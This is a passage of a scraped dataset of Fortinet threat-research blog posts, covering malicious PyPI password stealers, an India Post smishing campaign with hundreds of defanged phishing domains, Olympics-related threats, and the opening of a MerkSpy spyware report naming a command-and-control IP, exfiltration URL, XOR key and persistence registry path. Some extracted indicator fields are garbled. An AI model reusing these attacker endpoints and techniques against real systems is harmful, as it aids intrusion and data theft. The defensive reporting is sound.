databases where Chrome and Edge store login data to extract encrypted passwords. The code copies the `Login Data` file used by Chrome and Edge to a local file (`ChromeData.db`) to read its contents without locking issues. After extracting the encrypted passwords, the code decrypts them using the browser's encryption key. The extracted and decrypted data, including URLs, usernames, and passwords, are stored in a dictionary that can be sent to an attacker or saved for misuse. The code then removes the copied database file to clean up traces. Specific malicious elements include unauthorized access to browser data directories, decryption of sensitive data, and the potential exfiltration of collected passwords to an external server or attacker-controlled location. The identified malicious packages in PyPI are designed to steal sensitive information by accessing and decrypting stored data from web browsers, such as passwords and cookies. These actions can lead to unauthorized access to user accounts and the exfiltration of personal data, clearly classifying the software as malicious. It is crucial to remain vigilant and use detection systems like AI-driven OSS malware detection to identify and mitigate such threats, ensuring user privacy and security are maintained. FortiGuard AntiVirusdetects the malicious files identified in this report as Discord_token_grabber.pyc: <Python/Agent. OT!tr>Get_cookies.pyc:<Python/Agent. AZH!tr>Password_grabber.pyc: <Python/Agent. BG!tr>MinGCC-x64.exe:<Python/Stealer.804C!tr.pws> The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Hash (sha256) Dscord_token_grabber.pyc f49ba791814001b3d4101685bfebb635cdaf3103407a08171bb5d6bbe3e79c77 <Python/Agent. OT!tr> Get_cookies.pyc f7e8a57b54489b5b3de66a1d21534ced3d2a2fb1ce8d03c69d4672e62aa00dca <Python/Agent. AZH!tr> Password_grabber.pyc 589d438226abfec8f71ab7724c68011303f82febb6786fd0c57571b0769764f3 <Python/Agent. BG!tr> MinGCC-x64.exe 348ee268ef62af51add78b46df9fe8e2bdf41166d19084af75498333e81e6f3b <Python/Stealer.804C!tr.pws> FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/malicious-packages-hidden-in-pypl",
      "scraped_at": "2025-07-20T13:46:50.112541",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ookies",
          "r",
          "inGCC-x64",
          "hromeData"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "589d438226abfec8f71ab7724c68011303f82febb6786fd0c57571b0769764f3",
          "348ee268ef62af51add78b46df9fe8e2bdf41166d19084af75498333e81e6f3b",
          "f49ba791814001b3d4101685bfebb635cdaf3103407a08171bb5d6bbe3e79c77",
          "f7e8a57b54489b5b3de66a1d21534ced3d2a2fb1ce8d03c69d4672e62aa00dca"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.25691699604743085
    }
  },
  {
    "id": "Fortinet_61146",
    "source": "Fortinet",
    "title": "Phishing Campaign Targeting Mobile Users in India Using India Post Lures",
    "text": "FortiGuard Labs Threat Research Impacted Users:iPhone users in IndiaImpact:Possible financial loss; stolen information can be used for future attacksSeverity Level:Medium The FortiGuard Labs Threat Research team recently observed a number of social media posts commenting on a fraud campaign targeting India Post users. India Post is India’s government-operated postal system. It is part of the Ministry of Communications and has a vast network of over 150,000 post offices across the country, making it one of the largest postal systems in the world. In this campaign, iPhone users are being targeted by smishing attacks claiming to be from India Post. This scam involves sending an iMessage to iPhone users that falsely claims that a package is waiting at an India Post warehouse. Publicreportingsuggests this campaign is being attributed to a China-based threat actor known as theSmishing Triad. This group has previously targeted other regions, including the US, UK, EU, UAE, KSA, and, most recently, Pakistan. We have observed third-party email addresses such as Hotmail, Gmail, or Yahoo being used in phishing emails on iMessage. Apple allows users to create an Apple ID using these third-party email addresses as the primary email associated with their Apple ID. Once the Apple ID is created and configured for iMessage, the sender can use that third-party email address to send messages through iMessage. The messages often contain a short URL, leading to a fraudulent website. Upon investigation, we discovered a significant number of newly registered domains being used for current and potential phishing scams. This blog highlights the tools and methods used to propagate such phishing campaigns and explores the scale of these operations, the tactics employed by threat actors, and other relevant insights. Between January and July 2024, we found over 470 domain registrations mimicking India Post's official domain. Among these, 296 domains were registered via the Chinese registrarBeijing Lanhai Jiye Technology Co., Ltd.,followed by 152 registrations through Namesilo, an American domain registrar. The notable concentration of registrations through a Chinese registrar certainly raises substantial concerns about the underlying intentions. This activity exemplifies ahomograph phishing attack, where domain names are created to look visually similar to legitimate ones. The most frequently used top-level domains (TLDs) include 'vip' (200 registrations), 'top' (81 registrations), and 'buzz' (40 registrations). The registration cost per domain varies: 'vip' TLDs typically range from USD 4 to USD 5 per domain, whereas 'top' TLDs cost between USD 1 and USD 2 per domain. To calculate the total investment: Our analysis revealed that Tencent, a Chinese hosting service provider, hosts a significant number of these domains (232). Additionally, Tencent hosts 16 domains registered in Santa Clara. Further analysis revealed that 262 domain names point to the IP address 119.28.68[.]187, also hosted onTencent's servers. When investigating the phishing domain 'indiapost[.]top,' which impersonates India Post through a cloned copy of the original website, it was discovered that the domain does not host any content. Instead, specific paths on the domain are utilized to host the phishing website that impersonates India Post. While the domain name was registered on 28th November 2023, it is now actively being used in their operations. It is now likely to evade detection by antivirus engines as domains typically gain reputation over time. The phishing site (on the left) is an identical copy of the original India Post website (on the right). Continuing as a regular user, the fraudsters collect sensitive information such as name, full residential address, email ID, and phone number. This information can be leveraged in future operations for further scams, sending phishing emails, spreading disinformation/misinformation, or distributing malware. On the next page, the fraudulent site requests debit/credit card information for a payment of INR 25.02, claiming it is a charge for redelivering the package. The threat actors begin by sending a message via iMessage directly to the recipients' registered Apple ID email addresses. The sender ID could be a newly registered Apple ID or a compromised account. This method ensures that the message appears within the recipient's Messages app as an iMessage, distinct from traditional email communications, provided both parties use iMessage-enabled devices and have their Apple IDs configured for iMessage. The investment in registering these domain names alone exceeds USD 1500, not to mention additional costs for hosting and development. This significant investment highlights the threat actors' commitment, the phishing operation's scale, and its potential long-term impact. As a result, we feel that the likelihood of numerous victims falling prey to these scams is increased, leading to substantial financial losses, data breaches, and other security issues for individuals and organizations targeted by these domains. This operation may also serve as a strategic initiative to raise funds to fuel operations in China. Because of this, awareness and proactive measures are crucial to mitigating the risks posed by these phishing activities. The suspicious domains used in the campaign described in this report are detected and blocked by FortiGuard URL Filtering Service, utilized by FortiGate, FortiClient, and FortiMail, as: WebFilter:Phishing WebFilter:Spam URLs FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. italenbabusik@hotmail[.]comjessica467@qlq-online[.]demarrotte436915@gmail[.]comorozcoharryavw@hotmail[.]comchermonahscales2980545@gmail[.]com indiapost[.]xyz indiapost[.]online indiapost[.]live indiapost[.]biz indiapost[.]club indiapost[.]pics indiapost[.]homes indiapost[.]click indiapost[.]vip indiapost[.]buzz indiapost[.]sbs indiapost[.]skin indiapost[.]world indiapost[.]cfd indiapost[.]cyou indiapost[.]rest indiapost[.]site indiapost[.]mom indiapost[.]lat indiapost[.]lol indiapost[.]digital indiapostal[.]com indiapostdaily[.]com indiapostin[.]com indiaposte[.]com indiapostgdsonline[.]in indiapostcode[.]online indiapostalgds[.]com indiapostofficejob[.]org indiapostal[.]xyz indiapostrecruitment2021[.]xyz indiapostpayment[.]in indiapostfast[.]com indiapost-in[.]xyz indiapostin[.]top indiapostusa[.]xyz indiapostn[.]top indiapostgovv[.]top indiapostt[.]top indiapostgov[.]info indiapostgdsonline[.]ink indiaposte[.]top indiaposthuman[.]com indiaposti[.]icu indiapostgov[.]org indiapostalcode[.]org indiapostpogo[.]top indiapostgk[.]sbs indiapostij[.]top indiapostscv[.]top indiaposthy[.]top indiapostpv[.]top indiapostjx[.]top indiapostco[.]top indiapostcw[.]top indiapostkp[.]sbs indiapostkp[.]buzz indiapostbov[.]top indiapostnov[.]buzz indiapostgk[.]buzz indiapostscv[.]buzz indiapostsfv[.]buzz indiapostscv[.]sbs indiapostsfv[.]top indiapostfb[.]top indiapostwb[.]top indiapostxh[.]top indiapostyt[.]top indiapostgk[.]lol indiapostgv[.]lol indiapostbov[.]sbs indiapostnov[.]sbs indiapostkp[.]top indiapostlf[.]top indiapostbs[.]top indiapostbw[.]top indiapostcu[.]top indiapostem[.]top indiapostgl[.]top indiaposthk[.]top indiapostjd[.]top indiapostkg[.]top indiapostmc[.]top indiapostmr[.]top indiapostnj[.]top indiapostnn[.]top indiapostsc[.]top indiapostsy[.]top indiapostwy[.]top indiapostxf[.]top indiapostsx[.]buzz indiapostdgx[.]buzz indiapostsdu[.]buzz indiapostdes[.]buzz indiapostsx[.]icu indiapostdu[.]icu indiapostsdu[.]top indiapostcg[.]buzz indiapostgc[.]buzz indiapostnews[.]buzz indiaposttc[.]buzz indiapostdgx[.]lat indiapostvg[.]buzz indiapostcg[.]life indiapostvg[.]sbs indiapostbs[.]sbs indiapostvg[.]xyz indiapostjsx[.]xyz indiapostdm[.]buzz indiapostbm[.]buzz indiapostjsx[.]buzz indiapostdgx[.]cfd indiapostsx[.]cfd indiapostgx[.]cfd indiapostdgx[.]sbs indiapostdm[.]sbs indiapostjsx[.]sbs indiapostsx[.]sbs indiapostbm[.]top indiapostsx[.]xyz indiapostbm[.]xyz indiapostdgx[.]xyz indiapostdm[.]xyz indiapostlv[.]top indiapostmk[.]top indiapostil[.]top indiapostdgx[.]top indiapostkr[.]top indiapostlt[.]top indiapostgx[.]lat indiapostigu[.]xyz indiapostgx[.]world indiapostok[.]top indiapostrc[.]top indiapostah[.]top indiapostfw[.]top indiapostwl[.]top indiapostwm[.]top indiapostci[.]top indiapostdq[.]top indiapostjp[.]top indiapostmj[.]top indiapostnx[.]top indiapostos[.]top indiapostpy[.]top indiapostqr[.]top indiapostrq[.]top indiapostub[.]top indiapostwg[.]top indiapostyb[.]top indiapostyw[.]top indiapostzc[.]top indiapostzp[.]top indiapostsz[.]buzz indiapostzj[.]buzz indiapostgz[.]cfd indiaposteg[.]sbs indiapostsz[.]top indiaposteg[.]xyz indiapostges[.]xyz indiapostsz[.]xyz indiapostrg[.]xyz indiapostsge[.]xyz indiapostzj[.]xyz indiapostbg[.]vip indiapostrg[.]vip indiapostfd[.]vip indiaposthk[.]vip indiapostiw[.]vip indiapostfv[.]vip indiapostnz[.]vip indiapostfw[.]vip indiapostfj[.]vip indiapostux[.]vip indiapostox[.]vip indiapostdx[.]vip indiapostwe[.]vip indiapostwp[.]vip indiapostdt[.]vip indiapostpm[.]vip indiapostkx[.]vip indiapostpo[.]vip indiapostmr[.]vip indiapostym[.]vip indiapostmu[.]vip indiapostbl[.]vip indiapostjl[.]vip indiapostei[.]vip indiapostul[.]vip indiapostax[.]vip indiapostny[.]vip indiapostxt[.]vip indiapostik[.]vip indiapostir[.]vip indiapostns[.]vip indiapostqb[.]vip indiapost-update[.]com indiapostqq[.]vip indiapostdo[.]vip indiapostes[.]vip indiapostcp[.]vip indiapostfs[.]vip indiapost-updatemypost[.]com indiapost-trackmypost[.]com indiapostub[.]vip indiapostag[.]vip indiapostam[.]vip indiapostej[.]vip indiapostgt[.]vip indiapostgw[.]vip indiaposthn[.]vip indiapostlg[.]vip indiapostvb[.]vip indiapostxz[.]vip indiapostjo[.]vip indiapostne[.]vip indiapostps[.]vip indiapostby[.]vip indiapostoc[.]vip indiaposthd[.]vip indiapostxr[.]vip indiapostqw[.]vip indiapostmt[.]vip indiapostaz[.]vip indiapostvx[.]vip indiapostwq[.]vip indiapostuf[.]vip indiapostgi[.]vip indiapostjq[.]vip indiapostph[.]vip indiapostmz[.]vip indiapostdv[.]vip indiapostoi[.]vip indiapostrc[.]vip indiaposttg[.]vip indiapostbz[.]vip indiapostnt[.]vip indiapostek[.]vip indiapostld[.]vip indiaposttx[.]vip indiapostzv[.]vip indiapostjk[.]vip indiapostagov[.]icu indiapostusa[.]cfd indiapostwc[.]vip indiapostht[.]vip indiapostxf[.]vip indiapostib[.]vip indiapostgu[.]vip indiapostpq[.]vip indiaposteo[.]vip indiapostap[.]vip indiapostdf[.]vip indiapostjx[.]vip indiapostky[.]vip indiapostlj[.]vip indiapostmn[.]vip indiapostnr[.]vip indiapostqr[.]vip indiapostvg[.]vip indiapostzc[.]vip indiapost-trackpost[.]com indiapost-updatemyparcel[.]com indiapostusa[.]buzz indiapost-checkmypost[.]com indiapost-checkmymail[.]com indiaposte[.]buzz indiaposte[.]icu indiapostusa[.]icu indiapostlw[.]sbs indiapostgui[.]sbs indiapostigu[.]sbs indiapostgui[.]xyz indiapostdw[.]xyz indiaposte[.]xyz indiapostlw[.]xyz indiapostzd[.]vip indiaposteg[.]vip indiapostbv[.]vip indiapostur[.]vip indiapostiv[.]vip indiapostdd[.]vip indiapostqh[.]vip indiapostwg[.]vip indiapostsil[.]cyou indiapostru[.]vip indiapostbm[.]vip indiapostwh[.]vip indiapostmk[.]vip indiapostol[.]vip indiapostqs[.]vip indiapostlt[.]vip indiapostdw[.]top indiapostlw[.]top indiapostfr[.]vip indiapostbe[.]vip indiapostbs[.]vip indiapostcs[.]vip indiapostfn[.]vip indiapostfy[.]vip indiapostjd[.]vip indiapostjf[.]vip indiapostkm[.]vip indiapostkq[.]vip indiaposton[.]vip indiapostpj[.]vip indiapostpy[.]vip indiapostse[.]vip indiapostsq[.]vip indiapostss[.]vip indiapostvd[.]vip indiapostvy[.]vip indiapostxw[.]vip indiapostyr[.]vip indiapostsp[.]vip indiapostha[.]vip indiapostog[.]vip indiapostqf[.]vip indiapostut[.]vip indiapostwk[.]vip indiapostin[.]sbs indiapostin[.]xyz indiapostin[.]live indiapostsa[.]buzz indiaposta[.]buzz indiapostdw[.]buzz indiapostgv[.]buzz indiapostoffice[.]buzz indiaposts[.]buzz indiapostzh[.]buzz indiaposta[.]mom indiaposts[.]mom indiapostsa[.]mom indiapostzh[.]sbs indiaposta[.]xyz indiapostgv[.]xyz indiapostks[.]buzz indiapostgov[.]xyz indiapostgo[.]buzz indiapostgo[.]life indiapostgo[.]mom indiapostgds[.]org indiapostgo[.]xyz indiapostsge[.]cfd indiapostgv[.]cfd indiapostcp[.]buzz indiapostblog[.]buzz indiapostges[.]buzz indiapostsge[.]buzz indiapostsv[.]buzz indiapostoffice[.]hair indiapost-gov[.]life indiapostoffice[.]life indiapostgv[.]sbs indiaposty[.]xyz indiapostgy[.]vip indiapost-vip-in[.]buzz indiapostggs[.]cfd indiapostbs[.]cfd indiapostcp[.]sbs indiapostggs[.]sbs indiapost-i[.]com indiapostyxw[.]buzz indiapostgov[.]top indiaposti[.]com indiapost-gov[.]com indiapost-tel[.]com indiapost-in[.]com indiapost-gov[.]icu indiapost-in[.]net indiapost-postain[.]top indiapostiu[.]vip indiapost-indi[.]top indiaposttel[.]com indiapost1[.]com indiapost-i[.]net indiaposty[.]sbs indiapost-i[.]top indiapostoffice[.]top indiapost-ind[.]top indiapostaq[.]vip indiapostew[.]vip indiapostgf[.]vip indiapostlk[.]vip indiapostaw[.]vip indiapostds[.]vip indiaposter[.]vip indiapostjh[.]vip indiapostmf[.]vip indiapostnm[.]vip indiapostoj[.]vip indiapostop[.]vip indiapostqv[.]vip indiapostrl[.]vip indiaposttn[.]vip indiapostty[.]vip indiapostui[.]vip indiapostxc[.]vip indiapostxp[.]vip indiapostkz[.]vip indiapostq[.]xyz indiapostw[.]xyz indiaposta-in[.]top indiapost-gov-a[.]buzz indiapost-gov-in[.]buzz indiaposte[.]sbs indiapost-posta[.]top indiapostoffices[.]top indiapostgm[.]vip indiapostmh[.]vip indiapostbx[.]vip indiapostcb[.]vip indiapostjt[.]vip indiapostks[.]vip indiapostnh[.]vip indiapostnw[.]vip indiapostpt[.]vip indiapostrf[.]vip indiaposttj[.]vip indiapostwv[.]vip indiapostyx[.]vip indiapostyz[.]vip indiapostgx[.]vip indiapostpd[.]vip indiapostsl[.]vip indiapostvu[.]vip indiapostzy[.]vip indiapostvt[.]vip indiapostim[.]vip indiapostxn[.]vip indiapostqi[.]vip indiapostbj[.]vip indiapostyt[.]vip indiapostdk[.]vip indiapostnews[.]top indiapost-al[.]com indiaposty[.]cfd indiapostid[.]vip indiapost-ia[.]top indiapostk[.]com indiapost-gov-i[.]com indiapost-l[.]com indiapost-p[.]com indiaposta[.]com indiaposth[.]com indiapostl[.]com indiapostt[.]com indiapostos[.]com indiapostall[.]com indiapost-l[.]net indiapostgroup[.]net indiapostos[.]net indiapostkl[.]vip indiapostoffice[.]one indiapostpi[.]vip indiapostqo[.]vip indiapostyl[.]vip indiapostto[.]vip indiapostwf[.]vip indiapostnc[.]vip indiapostvm[.]vip indiaposttb[.]vip indiapostal[.]top indiapostao[.]vip indiapostit[.]vip indiapostec[.]vip indiapostsf[.]vip indiapostzu[.]vip indiapostic[.]vip indiapostix[.]vip indiapostil[.]vip indiapost-telgov[.]com indiapostos-in[.]com indiapost-h[.]com indiand[.]xyz/track/ dsfdg[.]sbs/i/ indiapostsi[.]top/IN/ indiapostin[.]com/in/ indiapost-id[.]top/BRblTi/ indiapost-i[.]net/in/ indiaapost[.]cyou/track/ indiaptgov[.]top/in/ indaai[.]live/track/ indiapost-al[.]com/in/ mobile,phishing FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/phishing-campaign-targeting-mobile-users-in-india-using-india-post-lures",
      "scraped_at": "2025-07-20T13:46:58.198997",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.23553162853297444
    }
  },
  {
    "id": "Fortinet_49494",
    "source": "Fortinet",
    "title": "Dark Web Shows Cybercriminals Ready for Olympics. Are You?",
    "text": "FortiGuard Labs Threat Research Major sporting events like the World Cup, Super Bowl, and Wimbledon attract millions, even billions, of viewers. Argentina’s shootout win over France in the final game of the Qatar 2022 World Cup reached a global audience of 1.5 billion viewers. And the Olympics, starting later this month in Paris, is the biggest of them all—with the 2020 Tokyo Olympics having attracted a worldwide audience of over 3 billion viewers. These events are also prime opportunities for cybercriminals. Over the past decade, the number of cyberattacks targeting major events has surged, increasing from 212 million documented attacks at the London 2012 Games to a staggering 4.4 billion at the Tokyo 2020 Games. These attacks often have direct financial motives, such as scams, digital fraud, or the acquisition of valuable data from attendees, viewers, and sponsors. In their excitement, eager fans often overlook potential risks when purchasing tickets, arranging accommodations, or buying memorabilia, making them easy targets for cybercriminals. Others, desperate to view specific events, are enticed by malicious websites offering free access, only to have their devices compromised or personal data stolen. And with the world’s media focused on the event, criminals with a political agenda are looking for a large audience for their message by disrupting a significant site or knocking critical services offline. According to a new FortiGuard Labs analysis based on threat intelligence provided byFortiRecon, this year’s Olympics have been a target for a growing number of cybercriminals for over a year. Using publicly available information and proprietary analysis, this report provides a comprehensive view of planned attacks, such as third-party breaches, infostealers, phishing, and malware, including ransomware. To download the full FortiGuard Labs report, visithere. FortiGuard Labs has observed a significant increase in resources being gathered for the Paris Olympic Games, especially those targeting French-speaking users, French government agencies and businesses, and French infrastructure providers. Beginning the second half of 2023, we saw a surge in darknet activity targeting France. This 80% to 90% increase has remained consistent across 2H 2023 and 1H 2024. The prevalence and sophistication of these threats are a testament to cybercriminals’ planning and execution, with the dark web serving as a hub for their activities. Documented activities include the growing availability of advanced tools and services designed to accelerate data breaches and gather personally identifiable information (PII), the sale of stolen credentials and compromised VPN connections to enable unauthorized access to private networks, and advertisements for phishing kits and exploit tools customized for the Paris Olympics. It also includes the sale of French databases that contain sensitive personal information, such as full names, dates of birth, government identification numbers, email addresses, phone numbers, residential addresses, and other PII, as well as combo lists (a collection of compromised usernames and passwords used for automated brute-force attacks) composed of French citizens. Given that Russia and Belarus are not invited to this year’s games, we have also seen a spike in hacktivist activity by pro-Russian groups—like LulzSec, noname057(16), Cyber Army Russia Reborn, Cyber Dragon, and Dragonforce—that specifically call out that they’re targeting the Olympic games. Groups from other countries and regions are also prevalent, including Anonymous Sudan (Sudan), Gamesia Team (Indonesia), Turk Hack Team (Turkey), and Team Anon Force (India). Phishing kits:While phishing is perhaps the easiest form of attack, many low-sophistication cybercriminals don’t know how to create or distribute phishing emails. Phishing kits provide novice attackers with a simple user interface that helps them compose a convincing email, add a malicious payload, create a phishing domain, and procure a list of potential victims. The addition of text-generating AI services has also eliminated the spelling, grammatical, and graphical errors that allow recipients to detect an email as malicious. The FortiGuard Labs team has also documented a significant number of typosquatting domains registered around the Olympics, including variations on the name (oympics[.]com, olmpics[.]com, olimpics[.]com, and others). These are combined with cloned versions of the official ticket website that take you to a payment method where you don’t get a ticket, and your money is gone. In collaboration with Olympic partners, the French Gendarmerie Nationale hasidentified 338 fraudulent websitesclaiming to sell Olympic tickets. According to their data, 51 sites have been shut down, and 140 have received formal notices from law enforcement. Similarly, several Olympic Games–themed lottery scams have been identified, with many impersonating major brands such as Coca-Cola, Microsoft, Google, the Turkish National Lottery, and the World Bank. The primary targets for these lottery scams are users in the U. S., Japan, Germany, France, Australia, the U. K., and Slovakia. We have also seen an increase in coding services for creating phishing websites and associated live panels, bulk SMS services to enable mass communication, and phone number spoofing services. These offerings can facilitate phishing attacks, spread misinformation, and disrupt communications by impersonating trusted sources, potentially causing significant operational and security challenges during the event. Infostealers:Information stealer malware is designed to stealthily infiltrate a victim’s computer or device and harvest sensitive information, such as login credentials, credit card details, and other personal data. We have also observed that threat actors are deploying various types of stealer malware to infect user systems and obtain unauthorized access. Threat actors and initial access brokers can further leverage this information to execute ransomware attacks, causing substantial harm and financial loss to individuals and organizations. Our data indicates that Raccoon is currently the most active infostealer in France, accounting for 59% of all detections. Raccoon is an effective and inexpensive Malware-as-a-Service (MaaS) sold on dark web forums. It steals browser autofill passwords, history, cookies, credit cards, usernames, passwords, cryptocurrency wallets, and other sensitive data. It is followed by Lumma (another subscription-based MaaS) at 21% and Vidar at 9%. In addition to celebrating athleticism and sportsmanship, the Paris Olympics 2024 is a high-stakes cyberthreat target, drawing attention from cybercriminals, hacktivists, and state-sponsored actors. Cybercriminals are leveraging phishing scams and fraudulent schemes to exploit unsuspecting participants and spectators. Fake ticketing platforms, fraudulent merchandise, and identity theft tactics threaten financial loss and undermine public trust in event-related transactions. Further, due to France’s political stances and international influence, the Paris Olympics 2024 is also a prime target for politically motivated groups. We anticipate that hacktivist groups will focus on entities associated with the Paris Olympics to disrupt the event, targeting infrastructure, media channels, and affiliated organizations to disrupt event proceedings, undermine credibility, and amplify their messages on a global stage. To learn more about FortiRecon and generating reports like this for your organization,visit here. Organizations and individuals attending the Olympic Games need to be aware of heightened travel-related cyberthreats. These include the increased likelihood of public Wi-Fi interception and fraudulent activities linked to Olympics-related events, including malicious websites and phishing scams. We also anticipate increased targeted attacks against VIPs, including government officials, senior executives, and key decision-makers, and additional precautions should be taken. FortiGuard Labs strongly recommends installing endpoint protection or EDR on all devices, taking extra care when connecting to public wireless networks, and using SASE services to encrypt traffic. Major events like the Olympics are good reminders that we all need to remain vigilant against cyberthreats. FortiGuard Labs recommends the following best security practices to safeguard yourself and your organization against cyberattacks. Employee and user training and awareness:Conduct regular training sessions to highlight the risks of Olympics-related social engineering lures in the runup to and during the Games. Training should focus on recognizing deceptive emails and fake websites and emphasize the importance of promptly reporting suspicious activities. Public awareness campaigns:Launch comprehensive public awareness campaigns to educate attendees and participants about cybersecurity threats. Guide identifying phishing attempts, avoiding suspicious links, and reporting potential threats to designated authorities. Protect sensitive data:Use security orchestration, automation, and response tools to detect and respond promptly to unusual activities. Maintain encrypted backups of critical data stored securely offline to mitigate the impact of ransomware attacks. Monitor the external attack surface:Continuously monitor and assess your IT infrastructure’s external attack surface to identify vulnerabilities and potential risks. Implement measures to secure remote desktop protocol access and prevent exploitation of web server misconfigurations. Visit theFortinet DRPpage for information on how FortiRecon can help. Enforce multi-factor authentication and strong password policies:Implement multi-factor authentication across all systems and enforce a robust password policy. Monitor darknet channels for compromised credentials to proactively protect organizational portals. User endpoint protection:Deploy antivirus and antimalware software on all devices to detect and mitigate phishing attempts and malware infections. Regularly update software to safeguard against known and unknown vulnerabilities. Implement patch management:Maintain up-to-date software and operating systems by promptly applying security patches. Prioritize critical vulnerabilities that could lead to remote code execution or denial-of-service attacks. DDoS protection:Safeguard infrastructure with multi-layered DDoS prevention solutions, including firewalls, VPNs, and anti-spam filters. Monitor network traffic for anomalies that may indicate DDoS attacks and take preemptive actions. Prevent ransomware attacks:Implement proactive measures such as regular software updates, secure offline backups, and user education to prevent ransomware incidents. Utilize threat intelligence to monitor darknet activities for potential threats and data leaks. Website defacement prevention:Deploy web application firewalls to filter and block malicious traffic, protecting against website defacement and unauthorized access attempts. Participate in threat hunting and response:Conduct robust threat-hunting activities based on compromised account information. Isolate infected systems promptly and perform system reimaging as necessary to mitigate threats. Leverage cyberthreat intelligence (CTI):Utilize CTI to gather real-time data on emerging cyberthreats and potential risks. Monitor darknet chatter for early indicators of cyberattacks and data leaks to enable proactive incident response. Download your copy of theThreat Actors Targeting 2024 Summer Olympics threat intelligence report. olympics,FortiRecon FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/dark-web-shows-cybercriminals-ready-for-olympics",
      "scraped_at": "2025-07-20T13:47:05.465150",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.31036623215394166
    }
  },
  {
    "id": "Fortinet_17501",
    "source": "Fortinet",
    "title": "MerkSpy: Exploiting CVE-2021-40444 to Infiltrate Systems",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Spyware is malicious software engineered to covertly monitor and gather information from a user’s computer without their awareness or consent. It can record activities like keystrokes, browsing behavior, and personal information, often transmitting this data to a third party for espionage or theft. FortiGuard Labs recently detected an attack exploiting the CVE-2021-40444 vulnerability in Microsoft Office. This flaw allows attackers to execute malicious code via specially crafted documents. In this instance, the exploitation led to the deployment of a spyware payload known as “MerkSpy.” MerkSpy is designed to clandestinely monitor user activities, capture sensitive information, and establish persistence on compromised systems. This blog will dissect the stages of this complex attack, offering insights into the techniques used by cybercriminals to infiltrate systems and steal sensitive data. The initial vector for this attack is a deceptive Microsoft Word document posing as a job description for a software developer position. Opening the document triggers the exploitation of CVE-2021-40444, a remote code execution vulnerability within the MSHTML component used by Internet Explorer in Microsoft Office. This vulnerability permits an attacker to execute arbitrary code on a victim’s machine without additional user interaction beyond opening the document. The attacker conceals the URL within the “\\_rels\\document.xml” file. It directs to hxxp://45[.]89[.]53[.]46/google/olerender[.]html, downloading an HTML file that sets the stage for the next phase of the attack. After the successful exploitation, the malicious document initiates the downloaded payload, “olerender.html,” from a remote server. This HTML file is strategically crafted, with innocuous script filling the beginning to mask its true intent. The end of the file conceals the shellcode and injection process, which propels the attack forward when executed on the victim’s machine. “olerender.html” first checks the system’s OS version. If it detects an X64 architecture, it extracts the embedded “sc_x64” shellcode. After determining the OS version and extracting the appropriate shellcode, “olerender.html” locates and retrieves the Windows APIs “VirtualProtect” and “CreateThread.” These functions are crucial for the following steps: it leverages “VirtualProtect” to modify memory permissions, allowing the decoded shellcode to be written into memory securely. Following this, “CreateThread” executes the injected shellcode, setting the stage for downloading and executing the next payload from the attacker’s server. This process ensures that the malicious code runs seamlessly, facilitating further exploitation. Once the shellcode is in place, it functions as a downloader, initiating the next phase of the attack. It reaches out to the same remote server to fetch a file, deceptively named “GoogleUpdate.” Despite its seemingly innocuous name, “GoogleUpdate” is far from benign. This file harbors the core malicious payload, which is deeply encoded to evade detection by standard security measures. Upon successful download, the shellcode meticulously decodes and prepares this payload for execution. Once “GoogleUpdate” is downloaded, the shellcode decodes the file using an XOR key of 0x25021420 and an increment value of 0x00890518. This decryption process is crucial as it extracts the concealed actual payload embedded within the file. By employing these specific cryptographic techniques, the shellcode ensures that the malicious content remains hidden, allowing the attacker to execute their intended operations on the compromised system effectively. The extracted payload is protected with VMProtect. Its primary function is seamlessly injecting the MerkSpy spyware into crucial system processes. MerkSpy spyware operates covertly within a system, enabling it to capture sensitive information, monitor user activities, and exfiltrate data to remote servers controlled by malicious actors. MerkSpy achieves persistence by masquerading as “Google Update,” adding a registry entry for “GoogleUpdate.exe” in “Software\\Microsoft\\Windows\\CurrentVersion\\Run.” This deceptive tactic ensures that MerkSpy launches automatically at system startup, enabling continuous operation and data exfiltration without the user’s knowledge or consent. Following its installation, MerkSpy initiates the exfiltration process and begins monitoring specific targets: capturing screenshots, logging keystrokes, retrieving Chrome login credentials, and accessing the MetaMask extension. Once it gathers this data, MerkSpy uploads the collected information to the attacker’s server through the URL hxxp://45[.]89[.]53[.]46/google/update[.]php. The POST request employs a user agent string of “WINDOWS” and uses a fixed boundary, “---------------------------update request,” indicating it is 